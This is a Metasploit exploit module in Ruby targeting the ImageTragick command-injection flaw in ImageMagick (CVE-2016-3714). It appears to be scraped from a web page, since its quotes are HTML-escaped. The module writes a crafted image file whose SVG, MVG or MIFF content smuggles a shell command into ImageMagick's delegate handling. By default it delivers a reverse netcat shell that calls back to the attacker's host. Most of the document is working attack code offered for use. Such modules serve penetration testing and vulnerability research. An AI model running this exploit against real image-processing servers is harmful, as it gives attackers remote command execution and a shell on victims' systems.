# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##
 
class MetasploitModule < Msf::Exploit
 
  Rank = ExcellentRanking
 
  include Msf::Exploit::FILEFORMAT
 
  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;            => &#039;ImageMagick Delegate Arbitrary Command Execution&#039;,
      &#039;Description&#039;     => %q{
        This module exploits a shell command injection in the way "delegates"
        (commands for converting files) are processed in ImageMagick versions
        <= 7.0.1-0 and <= 6.9.3-9 (legacy).
 
        Since ImageMagick uses file magic to detect file format, you can create
        a .png (for example) which is actually a crafted SVG (for example) that
        triggers the command injection.
 
        Tested on Linux, BSD, and OS X. You&#039;ll want to choose your payload
        carefully due to portability concerns. Use cmd/unix/generic if need be.
      },
      &#039;Author&#039;          => [
        &#039;stewie&#039;,            # Vulnerability discovery
        &#039;Nikolay Ermishkin&#039;, # Vulnerability discovery
        &#039;wvu&#039;,               # Metasploit module
        &#039;hdm&#039;                # Metasploit module
      ],
      &#039;References&#039;      => [
        %w{CVE 2016-3714},
        %w{URL https://imagetragick.com/},
        %w{URL http://seclists.org/oss-sec/2016/q2/205},
        %w{URL https://github.com/ImageMagick/ImageMagick/commit/06c41ab},
        %w{URL https://github.com/ImageMagick/ImageMagick/commit/a347456}
      ],
      &#039;DisclosureDate&#039;  => &#039;May 3 2016&#039;,
      &#039;License&#039;         => MSF_LICENSE,
      &#039;Platform&#039;        => &#039;unix&#039;,
      &#039;Arch&#039;            => ARCH_CMD,
      &#039;Privileged&#039;      => false,
      &#039;Payload&#039;         => {
        &#039;BadChars&#039;      => "\x22\x27\x5c", # ", &#039;, and \
        &#039;Compat&#039;        => {
          &#039;PayloadType&#039; => &#039;cmd cmd_bash&#039;,
          &#039;RequiredCmd&#039; => &#039;generic netcat bash-tcp&#039;
        }
      },
      &#039;Targets&#039;         => [
        [&#039;SVG file&#039;,  template: &#039;msf.svg&#039;], # convert msf.png msf.svg
        [&#039;MVG file&#039;,  template: &#039;msf.mvg&#039;], # convert msf.svg msf.mvg
        [&#039;MIFF file&#039;, template: &#039;msf.miff&#039;] # convert -label "" msf.svg msf.miff
      ],
      &#039;DefaultTarget&#039;   => 0,
      &#039;DefaultOptions&#039;  => {
        &#039;PAYLOAD&#039;               => &#039;cmd/unix/reverse_netcat&#039;,
        &#039;LHOST&#039;                 => Rex::Socket.source_address,
        &#039;DisablePayloadHandler&#039; => false,
        &#039;WfsDelay&#039;              => 9001
      }
    ))
 
    register_options([
      OptString.new(&#039;FILENAME&#039;, [true, &#039;Output file&#039;, &#039;msf.png&#039;])
    ])
  end
 
  def exploit
    if target.name == &#039;SVG file&#039;
      p = Rex::Text.html_encode(payload.encoded)
    else
      p = payload.encoded
    end
 
    file_create(template.sub(&#039;echo vulnerable&#039;, p))
  end
 
  def template
    File.read(File.join(
      Msf::Config.data_directory, &#039;exploits&#039;, &#039;CVE-2016-3714&#039;, target[:template]
    ))
  end
 
end

